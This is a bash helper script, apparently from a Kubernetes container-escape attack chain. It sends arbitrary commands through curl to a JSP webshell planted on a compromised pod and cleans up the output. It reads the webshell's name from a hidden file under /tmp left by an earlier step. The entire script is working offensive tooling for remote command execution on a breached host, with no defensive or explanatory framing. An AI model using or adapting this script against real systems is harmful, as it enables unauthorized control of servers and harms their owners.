#!/bin/bash
###############################################
# Helper: execute arbitrary commands on the
# compromised pod via the webshell
###############################################

[ -z "$HOST" ] && echo "ERROR: Set HOST variable first" && exit 1
[ $# -lt 1 ] && echo "Usage: $0 <command>" && exit 1

# Read webshell info from step 1
SHELL_FILE="/tmp/.k8s-escape-shell"
if [ -f "$SHELL_FILE" ]; then
    SHELL_NAME=$(sed -n '1p' "$SHELL_FILE")
    SHELL_URL="http://${HOST}/${SHELL_NAME}.jsp"
else
    # Fallback to default
    SHELL_URL="http://${HOST}/shell.jsp"
fi

COMMAND="$@"
echo "> $COMMAND"
curl -s --data-urlencode "cmd=$COMMAND" "$SHELL_URL" \
    | tr -d '\0' \
    | sed '/^\s*$/d' \
    | grep -v 'java\.io\.InputStream' \
    | grep -v '^//\s*$' \
    | grep -v '^- $'
echo ""
